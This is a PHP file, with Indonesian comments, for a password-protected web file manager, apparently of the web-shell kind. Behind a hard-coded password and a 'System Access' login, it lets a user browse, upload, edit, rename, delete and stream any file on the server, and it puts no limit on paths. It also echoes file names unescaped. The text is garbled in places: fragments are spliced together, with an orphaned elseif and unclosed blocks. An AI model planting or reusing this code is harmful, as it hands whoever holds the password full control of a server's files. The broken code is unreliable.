<?php
session_start();

$password = 'Beel';

// Proses Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Proses Login
if (isset($_POST['login'])) {
    if ($_POST['pass'] === $password) {
        $_SESSION['fm_logged_in'] = true;
    } else {
        $error = "Password salah!";
    }
}

// Halaman Login
if (empty($_SESSION['fm_logged_in'])) {
    echo '<div style="font-family: sans-serif; max-width: 300px; margin: 100px auto; border: 1px solid #ccc; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">';
    echo '<h3 style="text-align:center;">🔒 System Access</h3>';
    if (isset($error)) echo "<p style='color:red; text-align:center;'>$error</p>";
    echo '<form method="POST">';
    echo '<input type="password" name="pass" placeholder="Enter Key..." style="width: 100%; box-sizing: border-box; padding: 10px; margin-bottom: 15px;" required>';
    echo '<button type="submit" name="login" style="width: 100%; padding: 10px; background: #28a745; color: white; border: none; cursor: pointer; border-radius: 4px;">Unlock</button>';
    echo '</form></div>';
    exit;
}

// ==========================================
// CORE SYSTEM
// ==========================================
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath('.');
if (!$dir || !file_exists($dir)) $dir = realpath('.'); 

$msg = '';

// A. Hapus File / Folder (Folder harus kosong)
if (isset($_GET['del'])) {
    $target = realpath($_GET['del']);
    if (is_file($target)) {
        unlink($target) ? $msg = "File dihapus!" : $msg = "Gagal hapus file!";
    } elseif (is_dir($target)) {
        @rmdir($target) ? $msg = "Folder dihapus!" : $msg = "Gagal hapus folder! Pastikan folder kosong.";
    }
}

// B. Buat Folder Baru
if (isset($_POST['new_folder'])) {
    $new_dir = $dir . '/' . $_POST['folder_name'];
    if (!file_exists($new_dir)) {
        mkdir($new_dir) ? $msg = "Folder dibuat!" : $msg = "Gagal buat folder!";
    }
}

// C. Rename File / Folder
if (isset($_POST['rename_item'])) {
    $old = $_POST['old_name'];
    $new = $dir . '/' . $_POST['new_name'];
    rename($old, $new) ? $msg = "Berhasil di-rename!" : $msg = "Gagal rename!";
}

// D. Upload File
if (isset($_FILES['upload_file'])) {
    $target = $dir . '/' . basename($_FILES['upload_file']['name']);
    move_uploaded_file($_FILES['upload_file']['tmp_name'], $target) ? $msg = "Upload sukses!" : $msg = "Upload gagal!";
}

// E. Save File Edit
if (isset($_POST['save_file'])) {
    $file_target = $_POST['file_path'];
    $content = $_POST['file_content'];
    file_put_contents($file_target, $content) ? $msg = "File berhasil disimpan!" : $msg = "Gagal menyimpan file!";
}

// F. Stream Media File (Untuk Source Preview)
if (isset($_GET['stream']) && is_file($_GET['stream'])) {
    $stream_file = realpath($_GET['stream']);
    $ext = strtolower(pathinfo($stream_file, PATHINFO_EXTENSION));
    
    $mime_types = [
        'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg', 'png' => 'image/png',
        'gif' => 'image/gif', 'webp' => 'image/webp', 'svg' => 'image/svg+xml',
        'mp4' => 'video/mp4', 'webm' => 'video/webm', 'ogg' => 'video/ogg',
        'mp3' => 'audio/mpeg', 'wav' => 'audio/wav'
    ];
    
    if (array_key_exists($ext, $mime_types)) {
        header('Content-Type: ' . $mime_types[$ext]);
        header('Content-Length: ' . filesize($stream_file));
        readfile($stream_file);
        exit;
    }
}

            $is_img = in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg']);

                <?php elseif ($is_vid): ?>
                    <video controls style="max-width: 100%; max-height: 500px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">

            <?php
            $items = scandir($dir);
            if ($dir !== realpath('/')) {
                $parent = dirname($dir);
                echo "<tr><td>📁 <a href='?dir=" . urlencode($parent) . "'><strong>.. (Up)</strong></a></td><td>-</td><td>-</td></tr>";

            $preview_extensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'mp4', 'webm', 'ogg', 'mp3', 'wav'];

            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $path = $dir . '/' . $item;
                $is_dir = is_dir($path);
                $size = $is_dir ? '-' : round(filesize($path) / 1024, 2) . ' KB';
                
                // Cek apakah file bisa di-preview
                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
                $can_preview = in_array($ext, $preview_extensions);

                echo "<tr>";
                if ($is_dir) {
                    echo "<td>📁 <a href='?dir=" . urlencode($path) . "'>$item</a></td>";
                } else {
                    echo "<td>📄 " . htmlspecialchars($item) . "</td>";
                }
                echo "<td>$size</td>";
                
                // Kolom Aksi
                echo "<td>";
                if (!$is_dir) {
                    if ($can_preview) {
                        echo "<a href='?dir=".urlencode($dir)."&preview=".urlencode($path)."'>Preview</a> | ";
                    }
                    echo "<a href='?dir=".urlencode($dir)."&edit=".urlencode($path)."'>Edit</a> | ";
                }
                echo "<a href='#' onclick='renameItem(\"".addslashes($path)."\", \"".addslashes($item)."\")'>Rename</a> | ";
                echo "<a href='?dir=".urlencode($dir)."&del=".urlencode($path)."' onclick='return confirm(\"Hapus permanen $item?\")' style='color:red;'>Hapus</a>";

        <script>
        function renameItem(oldPath, currentName) {
            let newName = prompt("Masukkan nama baru:", currentName);
            if (newName != null && newName !== "" && newName !== currentName) {
                document.getElementById('old_name').value = oldPath;
                document.getElementById('new_name').value = newName;
                document.getElementById('renameForm').submit();
            }
